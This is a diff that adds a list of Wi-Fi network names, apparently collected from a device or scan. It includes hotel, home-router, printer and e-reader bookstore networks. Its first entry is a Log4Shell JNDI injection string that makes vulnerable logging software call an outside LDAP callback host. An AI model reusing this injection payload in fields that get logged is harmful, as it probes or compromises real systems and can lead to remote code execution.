@@ -1,0 +1,63 @@
+
+${jndi:ldap://xdcqka.dnslog.cn/}
+404 legacy
+Android Hotspot 9987200
+Arenas del Mar Guests
+AuroraWifi
+CCTV
+DIRECT-1C-HP ENVY 5640 series
+EBOOKS
+FRITZ!BOX 7490
+GVCSVAWDX
+HP-Print-3A-Officejet 6700
+Hasennest
+Haus am See
+Hotel de Londres
+Internet
+IoTNet
+NASHIRA P
+NETGEAR69
+NETGEAR69_EXT
+Nici
+NwRpJgexMzr37yeuCpsKdZuyABmzSVF4
+OTJ-77515
+Orion
+Palace50
+Rome Times Hotel
+Salzmann
+Santoni
+Sunrise_5G_Box_6454
+Swisscom_Auto_Login
+TP-LINK_AP_5A0A
+TPLINK DECO
+TWOOben
+The  Convent1
+To-Dublin
+TolinoIBS
+TolinoLibraccio
+UPC Wi-Free
+UPC Wi-Free Enterprise
+UPC0093957
+UPC1092683
+UPC1379113
+UPCC9D7FB3
+UPCD4D96DA
+UPCFEA24AB
+UPCPALACE50
+Villa Wanja
+WN-CMFHTP
+Xandari
+alpin
+alpin2
+bcym
+cobege
+digi-wlan-wpa
+eBook Reader
+mMvYG5a4TpyEzBHA8KxCwG6494Vdr2bh
+office_dmz
+shinta_mani
+solnet
+standaardboekhandeltolino
+wof-15533
+xlc-28786
+zvv2
